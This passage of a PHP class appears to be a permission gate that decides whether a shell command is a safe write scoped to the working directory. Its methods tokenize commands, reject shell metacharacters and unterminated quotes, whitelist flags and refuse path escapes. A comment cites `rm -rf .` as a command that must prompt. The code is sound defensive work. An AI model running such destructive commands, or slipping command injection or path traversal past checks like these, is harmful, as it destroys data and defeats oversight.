     *
     * Returns null — meaning "not a single scoped command, do not grant" — when
     * an unquoted {@see SHELL_METACHARS} character appears, when a
     * {@see DOUBLE_QUOTE_ACTIVE_CHARS} character appears inside double quotes, or
     * when a quote is left unterminated. Otherwise returns the words with their
     * quotes removed.
     *
     * @return string[]|null
     */
    private function tokenizeSingleCommand(string $command): ?array
    {
        $tokens = [];
        $current = '';
        $inWord = false;
        $quote = null;
        $length = strlen($command);

        for ($i = 0; $i < $length; ++$i) {
            $char = $command[$i];

            if ($quote === "'") {
                if ($char === "'") {
                    $quote = null;
                    continue;
                }
                $current .= $char;
                continue;
            }

            if ($quote === '"') {
                if ($char === '"') {
                    $quote = null;
                    continue;
                }
                if (str_contains(self::DOUBLE_QUOTE_ACTIVE_CHARS, $char)) {
                    return null;
                }
                $current .= $char;
                continue;
            }

            if ($char === "'" || $char === '"') {
                $quote = $char;
                $inWord = true;
                continue;
            }

            if ($char === ' ' || $char === "\t") {
                if ($inWord) {
                    $tokens[] = $current;
                    $current = '';
                    $inWord = false;
                }
                continue;
            }

            if (str_contains(self::SHELL_METACHARS, $char)) {
                return null;
            }

            $current .= $char;
            $inWord = true;
        }

        // An unterminated quote means the tokenization above is a guess.
        if ($quote !== null) {
            return null;
        }

        if ($inWord) {
            $tokens[] = $current;
        }

        return $tokens;
    }

    /**
     * Is `$token` a flag this predicate is willing to skip over?
     *
     * @see SCOPED_WRITE_SHORT_FLAGS for why this is a whitelist rather than a
     *      "starts with a dash" test.
     */
    private function isPermittedScopedWriteFlag(string $token): bool
    {
        if (str_starts_with($token, '--')) {
            return in_array($token, self::SCOPED_WRITE_LONG_FLAGS, true);
        }

        $cluster = substr($token, 1);
        if ($cluster === '') {
            return false;
        }

        for ($i = 0, $length = strlen($cluster); $i < $length; ++$i) {
            if (!str_contains(self::SCOPED_WRITE_SHORT_FLAGS, $cluster[$i])) {
                return false;
            }
        }

        return true;
    }

    /**
     * Does `$path` name something strictly below the working directory?
     *
     * Resolved LEXICALLY — no filesystem access — because the paths this gate
     * approves routinely do not exist yet (`mkdir ./x` is the whole point) and
     * `realpath()` returns false for those. Each `..` pops one segment; a `..`
     * with nothing to pop means the path escapes, and a path that resolves to
     * depth 0 IS the working directory rather than something inside it, so
     * `rm -rf .` prompts.
     */
    private function isContainedRelativePath(string $path): bool
    {
        if ($path === '' || $this->isAbsolutePath($path)) {
            return false;
        }

        $depth = 0;

        foreach (explode('/', $path) as $segment) {
            if ($segment === '' || $segment === '.') {
                continue;
            }

            if ($segment === '..') {
                if ($depth === 0) {
                    return false;
                }
                --$depth;
                continue;
            }

            ++$depth;
        }

        return $depth > 0;
    }

    private function isAbsolutePath(string $path): bool
    {
        return str_starts_with($path, '/') || str_starts_with($path, '~');
    }
}
